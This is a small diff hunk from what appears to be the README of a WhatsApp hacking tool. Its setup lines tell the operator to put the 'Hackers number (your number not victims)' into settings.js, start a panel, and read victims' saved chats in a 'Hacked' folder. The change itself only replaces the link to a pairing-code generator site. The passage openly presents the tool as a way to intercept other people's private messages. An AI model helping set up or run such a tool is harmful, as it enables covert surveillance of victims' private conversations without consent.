@@ -25,7 +25,7 @@
 <p align="left">° Add Hackers number(your number not victims) to settings.js</a>
 <p align="left">° Start the pannel and see the Hacked folder for saved chats</a>
 <p align="left">° Pair code genarator if you havent one
-<a href="https://ravindu-md-pair.onrender.com/"> Gen here</a>
+<a href="https://sula-md.pages.dev/"> Gen here</a>
 
 
 _Start_
